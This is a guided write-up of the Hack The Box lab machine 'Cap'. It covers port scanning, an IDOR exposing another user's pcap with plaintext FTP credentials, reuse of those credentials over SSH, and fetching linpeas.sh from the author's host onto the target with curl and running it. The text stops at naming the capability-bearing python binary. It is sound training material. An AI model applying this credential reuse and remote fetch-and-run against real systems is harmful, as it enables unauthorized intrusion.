
>[!tldr] Cap is an easy difficulty Linux machine running an #HTTP server that performs administrative functions including performing network captures. Improper controls result in `Insecure Direct Object Reference` ( #IDOR ) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.


# Guided Mode
---
1. `How many TCP ports are open?`
	1. I started with a `nmap` scan
```shell
nmap -sT -p- 10.129.48.110 --stats-every=5s
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```
- Flag #1 -> `3`

---
2. `After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?`
	1. Using the IP in the browser opens a website with a dashboard. 
	2. Clicking on the tab with "Security Snapshot" we notice the url is 
		1. `http://10.129.48.110/data/1`
- Flag #2 -> `data`

---
3. `Are you able to get to other users' scans?`
4. `What is the ID of the PCAP file that contains sensative data?`
	1. By changing the `/data/[id]` "id" into `0` allows us to get scans from that call
- Flag #3 -> `yes`
- Flag #4 -> `0` (we can download this! -> `0.pcap`)

---
5. `Which application layer protocol in the pcap file can the sensetive data be found in?`
	1. Opening the `0.pcap` file we see 3 protocols, http, tcp and ftp.
	2. By clicking on `ftp` and following the tcp stream we can see cleartext credentials for `nathan`:`Buck3tH4TF0RM3!`
- Flag #5 -> `ftp`

---
6. `We've managed to collect nathan's FTP password. On what other service does this password work?`
	1. We know the FTP credentials work, we already are signed in for HTTP, the last to check if `ssh`!
		1. ~~FTP~~
		2. ~~HTTP~~
		3. `SSH` 
			1. `ssh nathan@<host>`
			2. `nathan`:`Buck3tH4TF0RM3!` -> Works!!
- Flag #6 -> `ssh`

---
7. `Submit the flag located in the nathan user's home directory.`

```shell
nathan@cap:~$ ls -la
<SNIP>
-r-------- 1 nathan nathan   33 Aug 17 23:01 user.txt

nathan@cap:~$ cat user.txt
[REDACTED_FLAG]
```
- Flag #7 -> `[REDACTED_FLAG]`

---
8. `What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?`
	1. First i decided to send in `linpeas.sh` to automate the search for me
		1. Local Machine with `linpeas.sh` in directory: `python3 -m http.server 8888`
		2. Target: `curl http://<machine_ip>:8888/linpeas.sh`
		3. Target: `chmod +x linpeas.sh`
		4. Target: `./linpeas.sh`
	2. After looking through the results i notice one that might be useful, and it is ->
- Flag #8 -> `/usr/bin/python3.8`
